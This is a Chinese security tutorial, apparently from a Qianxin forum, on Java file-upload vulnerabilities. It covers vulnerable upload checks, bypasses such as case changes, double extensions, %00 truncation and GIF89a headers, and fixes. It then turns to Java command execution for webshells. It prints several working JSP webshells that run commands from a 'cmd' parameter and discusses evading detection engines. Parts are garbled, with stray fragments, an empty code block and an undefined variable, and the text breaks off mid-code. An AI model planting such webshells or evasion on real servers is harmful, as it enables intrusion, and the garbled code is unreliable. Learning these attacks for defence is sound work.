0x00 前言
=======

因为想要学习 Java 内存马的相关内容，但是有马不知道也挺可笑的，还是先学习一下相关的漏洞吧。

0x01 前置
=======

JAVA 文件上传
---------

Java 实现文件上传时常用的两个组件：apache.commons.fileupload 和 apache.commons.io ，我们导入这两个包以及 Servlet 相关，准备好 Tomcat 就可以起一个 文件上传 的 Servlet 了。

代码（从菜鸟教程学习就可以）：

```js
package com.upload.test;

import java.io.File;
import java.io.IOException;
import java.io.PrintWriter;
import java.util.List;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import org.apache.commons.fileupload.FileItem;
import org.apache.commons.fileupload.disk.DiskFileItemFactory;
import org.apache.commons.fileupload.servlet.ServletFileUpload;

/**
 * Servlet implementation class UploadServlet
 */
@WebServlet("/UploadServlet")
public class UploadServlet extends HttpServlet {
    private static final long serialVersionUID = 1L;

    // 上传文件存储目录
    private static final String UPLOAD_DIRECTORY = "upload";

    // 上传配置
    private static final int MEMORY_THRESHOLD   = 1024 * 1024 * 3;  // 3MB
    private static final int MAX_FILE_SIZE      = 1024 * 1024 * 40; // 40MB
    private static final int MAX_REQUEST_SIZE   = 1024 * 1024 * 50; // 50MB

    /**
     * 上传数据及保存文件
     */
    protected void doPost(HttpServletRequest request,
                          HttpServletResponse response) throws ServletException, IOException {
        // 检测是否为多媒体上传
        if (!ServletFileUpload.isMultipartContent(request)) {
            // 如果不是则停止
            PrintWriter writer = response.getWriter();
            writer.println("Error: 表单必须包含 enctype=multipart/form-data");
            writer.flush();
            return;
        }

        // 配置上传参数
        DiskFileItemFactory factory = new DiskFileItemFactory();
        // 设置内存临界值 - 超过后将产生临时文件并存储于临时目录中
        factory.setSizeThreshold(MEMORY_THRESHOLD);
        // 设置临时存储目录
        factory.setRepository(new File(System.getProperty("java.io.tmpdir")));

        ServletFileUpload upload = new ServletFileUpload(factory);

        // 设置最大文件上传值
        upload.setFileSizeMax(MAX_FILE_SIZE);

        // 设置最大请求值 (包含文件和表单数据)
        upload.setSizeMax(MAX_REQUEST_SIZE);

        // 中文处理
        upload.setHeaderEncoding("UTF-8");

        // 构造临时路径来存储上传的文件
        // 这个路径相对当前应用的目录
        String uploadPath = request.getServletContext().getRealPath("./") + File.separator + UPLOAD_DIRECTORY;

        // 如果目录不存在则创建
        File uploadDir = new File(uploadPath);
        if (!uploadDir.exists()) {
            uploadDir.mkdir();
        }

        try {
            // 解析请求的内容提取文件数据
            @SuppressWarnings("unchecked")
            List<FileItem> formItems = upload.parseRequest(request);

            if (formItems != null && formItems.size() > 0) {
                // 迭代表单数据
                for (FileItem item : formItems) {
                    // 处理不在表单中的字段
                    if (!item.isFormField()) {
                        String fileName = new File(item.getName()).getName();
                        String filePath = uploadPath + File.separator + fileName;
                        File storeFile = new File(filePath);
                        // 在控制台输出文件的上传路径
                        System.out.println(filePath);
                        // 保存文件到硬盘
                        item.write(storeFile);
                        request.setAttribute("message",
                                "文件上传成功!");
                    }
                }
            }
        } catch (Exception ex) {
            request.setAttribute("message",
                    "错误信息: " + ex.getMessage());
        }
        // 跳转到 message.jsp
        request.getServletContext().getRequestDispatcher("/message.jsp").forward(
                request, response);
    }
}
```

upload.jsp 用 html 写一个简单的上传页面即可

```js
<%@ page language="java" contentType="text/html; charset=UTF-8"
    pageEncoding="UTF-8"%>

<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>文件上传漏洞 Test</title>
</head>
<body>
<h1>文件上传漏洞 Test</h1>
<form method="post" action="/TomcatTest/UploadServlet" enctype="multipart/form-data">
    选择一个文件:
    <input type="file" name="uploadFile" />
    <br/><br/>
    <input type="submit" value="上传" />
</form>
</body>
</html>
```

message.jsp 返回文件上传的结果

```js
<%@ page language="java" contentType="text/html; charset=UTF-8"
    pageEncoding="UTF-8"%>

<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>文件上传结果</title>
</head>
<body>
    <center>
        <h2>${message}</h2>
    </center>
</body>
</html>
```

web.xml

```xml
<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xmlns="http://java.sun.com/xml/ns/javaee"
         xmlns:web="http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd"
         xsi:schemaLocation="http://java.sun.com/xml/ns/javaee
        http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd"
         id="WebApp_ID" version="2.5">
    <servlet>
        <display-name>UploadServlet</display-name>
        <servlet-name>UploadServlet</servlet-name>
        <servlet-class>com.upload.test.UploadServlet</servlet-class>
    </servlet>

    <servlet-mapping>
        <servlet-name>UploadServlet</servlet-name>
        <url-pattern>/TomcatTest/UploadServlet</url-pattern>
    </servlet-mapping>
</web-app>
```

启动一个测试的环境，当然我们菜鸟教程里的文件上传的代码和我们真正要进行测试的时候的代码还是有一定的区别的，我们后面用到什么样的直接改就好了。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-f1537cc7f342bae5d5bc907cd11ec5dabaa74c1a.png)

0x02 文件上传漏洞
===========

漏洞是 Web 的漏洞，所以就算后端语言不一样了漏洞本身的情况还是大体上没什么变化的，文件上传漏洞再 Java 中主要有这么几种情况：

- 服务端脚本语言中无任何过滤
- 前端 JS 进行限制
- 服务端脚本语言对后缀名进行限制
- 服务器端脚本语言对 MIME 类型进行检测
- 服务器端脚本语言对 文件头 进行检测

基本上和 PHP 是一模一样的，我们看一下对应的 Java 代码

无任何过滤
-----

略过了，就正常的编写 UploadServlet 的代码。

JS 限制
-----

在 jsp 文件中加入以下代码：

```js
<script type="text/javascript">

    function judge(){
        var file=document.getElementById("checkfile").value;
        if (file==null||file==""){
            alert("请选择要上传的文件");

            // location.reload(true);
            return false;
        }
        var isnext=false;
        var filetypes=[".jpg",".png"];
        var fileend=file.substring(file.lastIndexOf("."));
        for (var i=0;i<filetypes.length;i++){
            if (filetypes[i]==fileend){
                isnext=true;
                break;
            }
        }
        if (!isnext){
            document.getElementById("msg").innerHTML="文件类型不允许";

            // location.reload(true);
            return false;

        }else {
            return true;
        }

    }
</script>
```

通过 javascript 的功能对文件后缀名进行检测。

### 绕过

修改或禁用前端 JS 即可。

或者可以抓包后直接发包，也可以绕过。

服务端脚本语言对后缀名进行限制
---------------

### 黑名单未限制大小写

通过黑名单进行过滤

```java
        boolean flag=true;
        String filename = file.getOriginalFilename();
        System.out.println(filename);
        String suffix=filename.substring(filename.lastIndexOf("."));
        String[] blacklist={".jsp",".php",".exe",".dll",".vxd",".html"};//后缀名黑名单
        for (String s : blacklist) {
            if (suffix.equals(s)){
                flag=false;
                break;

            }

        }
        if (flag){ 
    文件上传部分 
    } else {
        request.setAttribute("message","非法文件类型");
    }
```

大小写绕过即可

### 黑名单未过滤全部可以利用的后缀名

这种情况可以使用 fuzz 来进行判断

### 对黑名单进行替换处理

```java
        String filename = file.getOriginalFilename();
        System.out.println(filename);
        String preFilename=filename.substring(0,filename.lastIndexOf("."));
        String suffix=filename.substring(filename.lastIndexOf("."));
    String[] blacklist={"jsp","php","exe","dll","vxd","html"};//后缀名黑名单
        for (String s : blacklist) {
            if (suffix.indexOf(s)!=-1){
                suffix=suffix.replace(s,"");//后缀存在黑名单字符串，则将字符串替换为空
            }
        }
        if (flag){ 
    文件上传部分 
    } else {
        request.setAttribute("message","非法文件类型");
    }
```

replace 替换为空，很经典的错误，双写即可绕过。

### 双后缀名绕过情况

以下代码，后端判断后缀名使用的是 `filename.indexOf(".")`，而不是 `filename.lastIndexOf(".")`，可通过双后缀名绕过检测，例如欲上传1.jsp，可将文件名改为1.jsp.jsp，这样后端获得的后缀名为.jsp.jsp，可通过检测。

```java
        boolean flag=true;
        String filename = file.getOriginalFilename();
        System.out.println(filename);

        String suffix=filename.substring(filename.indexOf("."));
    String[] blacklist={"jsp","php","exe","dll","vxd","html"};//后缀名黑名单
        for (String s : blacklist) {
            if (suffix.indexOf(s)!=-1){
                suffix=suffix.replace(s,"");//后缀存在黑名单字符串，则将字符串替换为空
            }
        }
        if (flag){ 
    文件上传部分 
    } else {
        request.setAttribute("message","非法文件类型");
    }
```

### 绕过

#### 上传不符合windows文件命名规则的文件名

上述代码可以通过抓包，修改文件名为如下形式：

- **点绕过1.jsp.**
- **空格绕过1.jsp(空格)**
- **1.jsp:1.jpg**
- **1.jsp::$DATA**

#### %00 截断

在jdk低版本（1.7及以下）中可以使用 %00 截断。

#### 图片木马

要结合文件包含

MIME类型检测绕过
----------

以下代码限制上传文件的MIME类型需为"image/jpeg","image/png"或"image/gif"，可通过抓包，修改Content-Type为合法类型绕过MIME类型检测

```java
    boolean flag=false;
        String filename = file.getOriginalFilename();
        String contentType = file.getContentType();
        System.out.println(filename);
        String[] whiteList={"image/jpeg","image/png","image/gif"};
        for (String s : whiteList) {
            if (contentType.equals(s)){
                flag=true;
            }
        }
        if (flag){
    文件上传部分 
    } else {
        request.setAttribute("message","非法文件类型");
    }
```

文件头检测绕过
-------

常见文件头:

| 文件类型 | 文件头 |
|---|---|
| JPEG (jpg) | FFD8FF |
| PNG (png) | 89504E47 |
| GIF (gif) | 47494638 |
| ZIP Archive (zip) | 504B0304 |
| RAR Archive (rar) | 52617221 |

以下代码，通过检测文件头部分判断上传的文件是否为图片，可利用如下两种方法绕过。

```java
       String filename = file.getOriginalFilename();

        boolean flag=false;
        byte[] b=new byte[50];
        try {
            InputStream inputStream = file.getInputStream();
            inputStream.read(b);
            System.out.println(b.toString());
            StringBuilder stringBuilder=new StringBuilder();
            if (b==null ||b.length<0){
                flag=false;
            }
            for (int i = 0; i < b.length; i++) {
                int v=b[i]&0xff;
                String hv=Integer.toHexString(v);//十六进制
                stringBuilder.append(hv);

            }
            System.out.println(stringBuilder.toString());
            String fileTypeHex = String.valueOf(stringBuilder.toString());
            Iterator<Map.Entry<String, String>> iterator = FileType.entrySet().iterator();
            while (iterator.hasNext()){//判断文件前几个字节是否为FileType中三种类型之一
                Map.Entry<String, String> next = iterator.next();
                if (fileTypeHex.toUpperCase(Locale.ROOT).startsWith(next.getValue())){
                    flag=true;
                }

            }

            inputStream.close();

        }catch (FileNotFoundException e){
            e.printStackTrace();
        }catch (IOException e){
            e.printStackTrace();

        }

        if (flag){
    文件上传部分 
    } else {
        request.setAttribute("message","非法文件类型");
    }
```

1. 最常见的就是在马的开头添加 GIF89a 了
2. 还可以进行图片马的制作，不过问题还是需要文件包含。

ImageIO判断上传图片文件
---------------

通过过 ImageReader 解码 file 并返回一个 BufferedImage 对象，如果找不到合适的 ImageReader 则会返回 null，我们可以认为这不是图片文件。

```java
        boolean flag=false;
        String filename = file.getOriginalFilename();
        String suffix = filename.substring(filename.lastIndexOf("."));
        String path="src\\main\\resources\\static\\upload";
        File fileDir = new File(path);
        File outfile = new File(fileDir.getAbsolutePath()+File.separator + filename);
        String[] whiteList={".jpg",".png"};
        for (String s : whiteList) {
            if (suffix.toLowerCase(Locale.ROOT).equals(s)){
                flag=true;
                break;
            }
        }
        File tmpFile=null;
        if (flag){
            tmpFile = new File(System.getProperty("java.io.tmpdir"), filename);
            try{
                file.transferTo(tmpFile);
                BufferedImage read = ImageIO.read(tmpFile);
                read.getWidth();
                read.getHeight();
            }catch (Exception e){
                e.printStackTrace();
                flag=false;
            }finally {
                if (flag){
                    try {
                        FileCopyUtils.copy(new FileInputStream(tmpFile), Files.newOutputStream(Paths.get(path,filename), StandardOpenOption.CREATE_NEW));
                        tmpFile.delete();
                        return "success";
                    }catch (FileNotFoundException e){
                        e.printStackTrace();
                    }catch (IOException e){
                        e.printStackTrace();
                    }
                }else {
                    model.addAttribute("msg","请上传图片文件！");
                }
            }
        }else {
            model.addAttribute("msg","文件后缀名不符合要求");
        }
        return "index";
    }
```

这里就只能进行图片马的制作，结合文件包含来实现漏洞利用了。

0x03 修复
=======

- 服务器端的检查最好使用白名单过滤的方法，黑名单极不可靠；
- 使用随机数改写文件名和文件路径。文件上传如果要执行代码，需要用户能够访问到这个文件。应用了随机数改写了文件名和路径，可防止大小写绕过、双后缀、多后缀等手段，将极大地增加攻击的成本；
- 文件上传目录设置为不可执行，只要web容器无法解析该目录下面的文件，即使攻击者上传了脚本文件，服务器本身也不会受到影响。
- 使用安全设备防御，恶意文件千变万化，隐藏手法也不断推陈出新，对普通的系统管理员来说可以通过部署安全设备来帮助防御。

0x04 命令执行
=========

Webshell 第一步，命令执行的方式的探索。

在 Java 这门灵活的语言中，我们可以通过反射来调用类中的方法来进行命令的执行，不过这首先要求我们知道有什么方法可以实现命令执行，实际上 Java 中命令执行的方式很多，我们不应该简单地局限于某几种方式。

java.lang.Runtime.exec
----------------------

最常见的命令执行方法。

每个 Java 应用程序都有一个 Runtime 类的应用实例，该实例允许应用程序与运行应用程序的环境进行交互。基础语法如下，不过这里这种写法是没有回显的，我们还要解决回显的问题：

```java
Runtime.getRuntime().exec('calc.exe')；
```

在学习反射的时候我们就说到过，Runtime 是一种叫 "单例模式" 的设计模式，，举例是数据库的链接，数据库只需要链接一次，如果可以多次调用的话可能就会导致错误建立了多个数据库链接，作为开发者，这个时候就可以将类的构造函数设置为私有，然后编写一个静态方法

```java
public class TrainDB { 
    private static TrainDB instance = new TrainDB(); 

    public static TrainDB getInstance() { 
        return instance; 
    }

    private TrainDB() { 
        // 建立连接的代码... 
    } 
}
```

我们只能通过 Runtime.getRuntime() 来获取到 Runtime 对象，Runtime 内部的实现代码如下：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-3f38c14a5bbedd89a3cf5922ccd5f31c4bc1fafc.png)

Runtime 类中重写了很多的 exec 方法来应对各种参数的情况，最后我们可以将他们归结到这个 exec 方法中

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-33ba544ca1a62d9565aa59f141b6a51b3fa8fba2.png)

我们实际上是调用了一个 ProcessBuilder.start() 方法来实现的命令执行，在此之前还要经过一个环境变量以及路径的获取，以及 ProcessBuilder 本身的构造方法。

在此之前，Runtime 类中也对传入的数据进行了处理

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-3d10ffb5d1cdd958eec0218cfbe21aa80268bf16.png)

可以看到上面两种 exec 最后都会先进入到这里的第三个 exec 中进行处理，这里整体来看也就是我们第一个参数 command 如果传入的是字符串形式都会进行这里的处理。

这里利用 StringTokenizer 来进行处理，，它会把`\t\n\r\f`都当成分隔符，也就是会根据回车、空格对字符串进行分割。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-388cd0ca85d3e5904054d47f796a4be96bdb31ec.png)

然后构造成数组，也就是 cmdarray

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-452fe69bf95f49509e29e137dc8ee3c4768607be.png)

进而进入ProcessBuilder.start() 方法

这里反馈到我们的操作系统上的话也就是说，我们会有这么几种命令执行的方式（以打开计算器为例）：

```java
String cmd = "cmd /c calc";
String cmd = "/bin/sh -c gnome-calculator";
//上面的形式会被 StringTokenizer 处理，我们也可以直接传入数组
String [] cmd={"cmd","/c","calc"};
String [] cmd={"/bin/sh","-c","gnome-calculator"}; 
```

这里有一个需要注意的点

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-01989e6e3390a5d0f7122fd024b8f6bcf1550fbd.png)

在 linux 下进行测试，我们可以发现 `/bin/sh -c echo xxx > 1.txt` 这种写法并不能成功写入，`/bin/sh -c "echo xxx > 1.txt"` 这种方式才能成功写入，我们在执行命令的时候需要注意。

### IO流 &gt; 回显

我们使用 java.lang.Runtime 时完整的一个 shell 大致如下：

```java
    public static void main(String[] args) throws IOException {
        String [] cmd={"cmd","/c","whoami"};
        Process p=Runtime.getRuntime().exec(cmd);
        InputStream ins= p.getInputStream();
        String line=null;
        InputStreamReader inputStreamReader=new InputStreamReader(ins);
        BufferedReader bufferedReader=new BufferedReader(inputStreamReader);
        while((line=bufferedReader.readLine())!=null){
            System.out.println(line);
        }
    }、atement
```

atement

IO 流也就是Input 以及 Output， Input 是从外部读入数据到内存，Output 是把数据从内存读到外部。IO流以byte（字节）为最小单位，因此也称为字节流，也就是 Inputstream 以及 OutputStream，输入字节流 以及 输出字节流，字节为十六进制，并不易读，所以我们通常还要对他们进行字符的转换，也就是字符流，字符流的输入和输出分别用 Reader 和 Writer 来进行。

命令执行的过程发生在系统层面，是在 Java 外部，所以我们首先需要用 Input 来进行读入操作，也就是

```java
        String [] cmd={"cmd","/c","whoami"};
        Process p=Runtime.getRuntime().exec(cmd);
        InputStream ins= p.getInputStream();
```

这里的 getInputStream 方法是 Process 类的方法，就是为了将命令执行的操作结果读入。

InputStream 是一个抽象类，是所有字节输入流的超类，子类包括 FileInputStream、ByteArrayInputStream 等。Reader 则是所有字符输入流的超类，InputStreamReader 是其子类，也是字节流到字符流的桥梁，将任何 InputStream 转换为 Reader，然后用缓冲区接收并读取、打印

```java
        String line=null;
        InputStreamReader inputStreamReader=new InputStreamReader(ins);
        BufferedReader bufferedReader=new BufferedReader(inputStreamReader);
        while((line=bufferedReader.readLine())!=null){
            System.out.println(line);
        }
```

### JSP 回显

上面是我们在 Java 中所编写的一个 main 方法，但是我们写入的 Webshell 不可能是一个 class 类，我们需要的是一个 JSP 的 shell ，传入后执行方法。

我们知道，我们是可以通过 `<% %>` 标签，在 JSP 中执行 Java 代码的操作的，或者等价的 XML 语句 `jsp:scriptlet` 标签。

这种方式也是可以直接实现执行命令的：

```java
<%
        ScriptEngineManager manager = new ScriptEngineManager(null);
        ScriptEngine engine = manager.getEngineByName("nashorn");
        String payload=request.getParameter("cmd");
        Compilable compEngine=(Compilable)engine; 
        CompiledScript script=compEngine.compile(payload);
        BufferedReader object=(BufferedReader)script.eval(); 
        String line="";
        String result="";
        while((line=object.readLine())!=null){
            result=result+line;
        }
        out.println(result);
%>
```

我们可以通过 `<%@ page ... %>` 来导入包，结合我们上面的 Java 代码编写如下 demo

```java
<%@ page import="java.io.BufferedReader" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.io.InputStreamReader" %>
<html>
<body>
<h2>Runtime JSP WebShell Demo</h2>
<%
    String cmd = request.getParameter("cmd");
    Process process = Runtime.getRuntime().exec(cmd.split(" "));
    InputStream inputStream = process.getInputStream();
    StringBuilder stringBuilder = new StringBuilder();
    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
    String line;
    while((line = bufferedReader.readLine()) != null) {
        stringBuilder.append(line).append("\n");
    }
    if (stringBuilder.length() > 0) {
        response.getOutputStream().write(stringBuilder.toString().getBytes());
    }
%>
</body>
</html>
```

我们通过 getParameter 和 `cmd.split(" ")` 来实现通过传入 HTTP 参数来控制的命令执行，后续的设置和我们上面大部分是一致的。

`System.out.println` 是用于终端输出的，我们想要在页面上实现正常的输出要复杂一点。

我们需要将 line 进行拼接，但是如果我们采用 `s=s+line` 的方式 每次胜场的都是临时对象浪费内存并且影响 GC 效率，这里 Java 标准库提供了 StringBuilder 来进行字符拼接，它进行的是链式操作，append 方法进行拼接并返回 this，通过不断地对自身的调用来实现。

Runtime类除了上述常用于命令执行的方法，还具有查看JVM内存的 `freeMemory、totalMemory、maxMemory`，还有Agent内存马中用于添加钩子进行免杀的 `addShutdownHook` 方法

ProcessBuilder
--------------

> 由于 Java 面向对象的特性，几乎每个类都不是独立的，背后都是有一系列的继承关系。查杀引擎可能会识别常见的恶意类，但是 **我们就可以通过查找恶意类的底层实现或者高层包装类进行绕过**，从而实现Webshell的免杀。

我们在刚刚学习 Runtime 类的命令执行方法的时候看到过，我们的命令执行最后就是靠 ProcessBuilder 对象实现的。

ProcessBuilder 类就是 Java 中用于创建操作系统进程的类，我们直接把 Runtime 里的实例化拿出来也是一样可以实现命令执行的

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-1e7bb575ee1bb8e6ccebeabc56bb93f1f3cba871.png)

也就是

```java
Process process = new ProcessBuilder().command(s.split(" ")).start();
```

```java
<%@ page import="java.io.BufferedReader" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.io.InputStreamReader" %>
<html>
<body>
<h2>ProcessBuilder JSP WebShell</h2>
<%
    String s= request.getParameter("cmd");
    Process process = new ProcessBuilder().command(s.split(" ")).start();
    InputStream inputStream = process.getInputStream();
    StringBuilder stringBuilder = new StringBuilder();
    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
    String line;
    while((line = bufferedReader.readLine()) != null) {
        stringBuilder.append(line).append("\n");
    }
    if (stringBuilder.length() > 0) {
        response.getOutputStream().write(stringBuilder.toString().getBytes());
    }
%>
</body>
</html>
```

ProcessBuilder.start 会开启进程，实际调用的是 `ProcessImpl.start` ，ProcessImpl 是 Process 的子类，Process 本身是一个抽象类，内部写好了一系列的待实现的进程处理、获取进程的输入输出流、等待或销毁进程等相关的方法，ProcessImpl 便是其具体的实现。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-1733664a101c98f6ed8e12cd13f963c0f4dcb22d.png)

ProcessImpl
-----------

根据刚刚的思路，我们的 ProcessBuilder 最终也不是调用的自己内部的方法来实现命令执行，而是去调用了 ProcessImpl 这一 Process 类的实现来完成命令执行，那么我们同样也就可以直接通过这里的 command 方法来实现命令执行

在 ProcessBuilder 类中是这样的返回：

```java
ProcessImpl.start(cmdarray, this.environment, dir, redirects, this.redirectErrorStream);
```

但是我们可以发现一个问题

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-ff2018553410855d158ea52d52029159384122c3.png)

ProcessImpl 类是被 final 实现的，其中的属性也都是 private 类型的，我们没有办法直接 new 一个实例出来访问它其中的静态方法，解决的方式也很简单了，我们利用反射来进行构造就好了，在反序列化的学习中我们也遇到过类似的问题

```java
    static Process start(String[] cmdarray, Map<String, String> environment, String dir, Redirect[] redirects, boolean redirectErrorStream) throws IOException {
```

forName 获取类，getDeclaredMethod 获取方法，这里 start 的参数真的多啊，setAccessible 设置权限之后就可以 invoke 了

```java

atement
```

JSP:

```java
<%@ page import="java.io.BufferedReader" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.io.InputStreamReader" %>
<html>
<body>
<h2>ProcessImpl JSP WebShell</h2>
<%
    String [] cmd = {"cmd","/c","whoami"};
    Class processimpl = Class.forName("java.lang.ProcessImpl");
    Method start = processimpl.getDeclaredMethod("start", String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, boolean.class);
    start.setAccessible(true);
    Process process = (Process) m1.invoke(processimpl,cmd,null,null,null,false);
    InputStream inputStream = process.getInputStream();
    StringBuilder stringBuilder = new StringBuilder();
    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
    String line;
    while((line = bufferedReader.readLine()) != null) {
        stringBuilder.append(line).append("\n");
    }
    if (stringBuilder.length() > 0) {
        response.getOutputStream().write(stringBuilder.toString().getBytes());
    }
%>
</body>
</html>
```

ScriptEngineManager
-------------------

`javax.script` ，从JDK1.6开始引入，用于解析Javascript，被称作Java脚本引擎。

ScriptEngineManager 根据 name（ js 或 javascript ）可以获取 javascript 脚本的 Factory 并生成对应的 ScriptEngine ，然后就可以利用 `ScriptEngine.eval()` 解析脚本字符串。用法如下

```java
ScriptEngineManager manager = new ScriptEngineManager(null);
ScriptEngine engine = manager.getEngineByName("js");
String script="java.lang.Runtime.getRuntime().exec(\"calc\")";
engine.eval(script);
```

从 JDK 1.8 开始，Nashorn 取代 Rhino（JDK 1.6, JDK1.7）成为 Java 的嵌入式 JavaScript 引擎，并在JDK15被取消。

Nashorn
-------

JDK1.8开始采用的是Nashorn引擎，它支持的 name 可以在 NashornScriptEngineFactory 中看到（package-info.class）

```java
private static final List<String> names = immutableList("nashorn", "Nashorn", "js", "JS", "JavaScript", "javascript", "ECMAScript", "ecmascript");
private static final List<String> mimeTypes = immutableList("application/javascript", "application/ecmascript", "text/javascript", "text/ecmascript");
private static final List<String> extensions = immutableList("js");
```

### 输出

`print()、printf()、echo()` 都是用于脚本输出。利用输出来写文件的Demo如下

```java
ScriptEngineManager manager = new ScriptEngineManager(null);
ScriptEngine engine = manager.getEngineByName("JavaScript");
File outputFile = new File("jsoutput.txt");
FileWriter writer = new FileWriter(outputFile);
ScriptContext defaultCtx = engine.getContext();
defaultCtx.setWriter(writer);
String script = "print(\"This is AxisX Test\")";
engine.eval(script);
writer.close();
```

### 传参

`put()` 放入键值对，get取键。这也称为脚本绑定。绑定（Bindings）是一组键/值对，键必须是非空的非空字符串。

```java
ScriptEngineManager manager = new ScriptEngineManager(null);
ScriptEngine engine = manager.getEngineByName("JavaScript");
String script = "print(msg)";
engine.put("msg", "This is AxisX Test");
engine.eval(script);

engine.get("msg");
```

### 全局特性

1. Nashorn 将所有 Java 包都定义为名为 Packages 的全局变量的属性
    
    也就是`java.lang.Runtime`可以写为`Packages.java.lang.Runtime`，所以脚本可以写成
    
    ```java
    String script="Packages.java.lang.Runtime.getRuntime().exec(\"calc\")";
    ```
2. Java 对象的 `type()` 函数将 Java 类型导入脚本中
    
    也就是类对象可以通过 `Java.type(\"java.lang.Runtime\");` 的形式获取，所以脚本可以写成
    
    ```java
    String script="var runtime=Java.type(\"java.lang.Runtime\"); var object=runtime.getRuntime(); object.exec(\"calc\");";
    ```
3. 内置函数 `importPackage()` 和 `importClass()` 分别从包中导入所有类和从包导入类
    
    要在 Nashorn 中使用这些函数，需要先使用 `load()` 函数从 `mozilla_compat.js` 文件加载兼容性模块。
    
    ```java
    String script = "load(\"nashorn:mozilla_compat.js\"); importPackage(java.lang); var x=Runtime.getRuntime(); x.exec(\"calc\");";
    String script = "load(\"nashorn:mozilla_compat.js\"); importClass(java.lang.Runtime); var x=Runtime.getRuntime(); x.exec(\"calc\");";
    ```
4. 可以在 with 语句中使用 JavaImporter 对象的类的简单名称
    
    ```java
    String script="var importer =JavaImporter(java.lang); with(importer){ var x=Runtime.getRuntime().exec(\"calc\");}";
    ```

以上几种方式都可以帮助我们完成 shell

### 反射

还可以利用传入的语句来实现反射

```java
String script1 = "var clazz = java.security.SecureClassLoader.class;\n" +
        "        var method = clazz.getSuperclass().getDeclaredMethod('defineClass', 'axisx'.getBytes().getClass(), java.lang.Integer.TYPE, java.lang.Integer.TYPE);\n" +
        "        method.setAccessible(true);\n" +
        "        var classBytes = 'base64加密的字节码';" +
        "        var bytes = java.util.Base64.getDecoder().decode(classBytes);\n" +
        "        var constructor = clazz.getDeclaredConstructor();\n" +
        "        constructor.setAccessible(true);\n" +
        "        var clz = method.invoke(constructor.newInstance(), bytes, 0 , bytes.length);\nprint(clz);" +
        "        clz.newInstance();";
```

```java
    @ConstructorProperties({"target", "methodName", "arguments"})
    public Expression(Object target, String methodName, Object[] arguments) {
        super(target, methodName, arguments);
    }
```

命令执行写法如下

```java
Expression expression=new Expression(Runtime.getRuntime(),"exec",new Object[]{"calc"});
expression.getValue();
```

getValue 实际调用的是 `java.beans.Statement#invoke`

```java
public Object getValue() throws Exception {  setValue(invoke());  }
```

再往下追踪其实调用的是 `java.beans.Statement#invokeInternal`，它非常典型地实现了反射

```java
private Object invokeInternal() throws Exception {
    Object target = getTarget();
    String methodName = getMethodName();
    Object[] arguments = getArguments();
    if (target == Class.class && methodName.equals("forName")) {
        return ClassFinder.resolveClass((String)arguments[0], this.loader);
    }
    Class<?>[] argClasses = new Class<?>[arguments.length];
    for(int i = 0; i < arguments.length; i++) {
        argClasses[i] = (arguments[i] == null) ? null : arguments[i].getClass();
    }
    ...
```

所以 `Expression` 也可以替换成 `Statement` 来执行命令

Statement
---------

`java.beans.Statement` 位于的 `java.beans`包常用于反射相关功能。Statement 中的 Invoke、InvokerInternal 方法都是无法直接调用的，但是 execute 方法调用了 Invoke，

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-6bdaed43b2ae4a262ca9c55706f60e483e427ac0.png)

所以上述 Expression 的写法还可以改成如下的形式。

```java
Statement statement=new Statement(Runtime.getRuntime(),"exec",new Object[]{"calc"});
statement.execute();
```

ScriptEngineManager 有 eval 函数，ELProcessor 也有 eval 函数，它位于 tomcat 。

```java
String script= "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"js\").eval(\"var exp='"+cmd+"';java.lang.Runtime.getRuntime().exec(exp);\")";
ELProcessor elProcessor = new ELProcessor();
Process process = (Process) elProcessor.eval(script);
```

ELProcessor
-----------

ELProcessor 也有 eval 函数，它位于 tomcat，也就是 EL 表达式的支撑

ELProcessor 的 eval 方法调用的是 getValue，其实现如下，Expression 的创建由 factory 来实现，factory 则是由 ELManager 来创建的

```java
    private final ExpressionFactory factory;

    public ELProcessor() {
        this.context = this.manager.getELContext();
        this.factory = ELManager.getExpressionFactory();
    }

&%    public Object getValue(String expression, Class<?> expectedType) {
        ValueExpression ve = this.factory.createValueExpression(this.context, bracket(expression), expectedType);
        return ve.getValue(this.context);
   @  }
```

那么 ELProcessor 的写法也可以改成 ELManager 来实现

ELManager
---------

```java
String script= "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"js\").eval(\"var exp='calc';java.lang.Runtime.getRuntime().exec(exp);\")";
ELManager elManager=new ELManager();
ELContext elContext=elManager.getELContext();
ExpressionFactory expressionFactory=ELManager.getExpressionFactory();
ValueExpression valueExpression=expressionFactory.createValueExpression(elContext,"${"+script+"}",Object.class);
valueExpression.getValue(elContext);
```

完整的利用 Tomcat EL 的 shell

```java
<%@ page import="javax.el.ELProcessor" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.io.BufferedReader" %>
<%@ page import="java.io.InputStreamReader" %>
<html>
<body>
<h2>Tomcat EL的JSP WebShell</h2>
<%
    StringBuilder stringBuilder = new StringBuilder();
    String cmd = request.getParameter("cmd");
